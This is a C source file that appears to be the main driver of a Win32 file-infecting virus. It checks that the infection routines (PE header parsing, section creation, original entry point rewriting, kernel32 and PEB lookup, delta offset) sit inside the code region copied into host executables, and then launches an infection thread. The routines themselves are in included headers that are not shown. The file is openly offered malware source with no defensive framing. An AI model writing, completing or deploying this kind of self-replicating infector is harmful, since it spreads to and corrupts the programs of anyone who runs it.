#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "code_begin.h"
#include "code_end.h"
#include "data.h"
#include "function_list.h"
#include "infect.h"
#include "infection_thread.h"
#include "oep.h"
#include "pe.h"
#include "process_info.h"
#include "string_generator.h"
#include "utility.h"

#ifdef _WIN64
#error "Currently only support Win32"
#endif

#define IN_BOUNDARIES(f)                                                       \
    ((void *)f >= (void *)code_begin && (void *)f < (void *)code_end)

static uint8_t check_functions(void);

// main function is not copied during infection, so can use any external
// function_list here
int main(int argc, char **argv) {
    if (!IS_32_BIT) {
        PRINT_DEBUG("Not 32 bit, aborting");
        return 1;
    }

    PRINT_DEBUG("bit_width: %d", IS_32_BIT ? 32 : IS_64_BIT ? 64 : 0);
    PRINT_DEBUG("code_begin: 0x%p", code_begin);
    PRINT_DEBUG("code_end: 0x%p", code_end);
    PRINT_DEBUG("code_size: %.2fkiB", (float)CODE_SIZE / 1024.);
    uint8_t sane_function_locations = check_functions();
    PRINT_DEBUG("sane function locations: %s",
                sane_function_locations ? "yes" : "no");
    if (!sane_function_locations) {
        PRINT_DEBUG("function locations not sane, aborting");
        return 2;
    }

    spawn_infection_thread();
    fgetc(stdin);
    return 0;
}

static uint8_t check_functions(void) {
    return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
           IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
           IN_BOUNDARIES(checksum) && IN_BOUNDARIES(fill_function_list) &&
           IN_BOUNDARIES(get_data) && IN_BOUNDARIES(get_function_by_checksum) &&
           IN_BOUNDARIES(spawn_infection_thread) &&
           IN_BOUNDARIES(get_original_entry_point) &&
           IN_BOUNDARIES(write_original_entry_point) && IN_BOUNDARIES(is_pe) &&
           IN_BOUNDARIES(align_value) && IN_BOUNDARIES(get_nt_header) &&
           IN_BOUNDARIES(get_section_header) &&
           IN_BOUNDARIES(get_last_section_header) &&
           IN_BOUNDARIES(get_export_directory) &&
           IN_BOUNDARIES(is_section_header_empty) &&
           IN_BOUNDARIES(create_section_header) && IN_BOUNDARIES(get_teb) &&
           IN_BOUNDARIES(get_peb) && IN_BOUNDARIES(get_image_base) &&
           IN_BOUNDARIES(get_kernel32_base) &&
           IN_BOUNDARIES(get_delta_offset) && IN_BOUNDARIES(memzero) &&
           IN_BOUNDARIES(memcp) && IN_BOUNDARIES(same_case_insensitive);
}
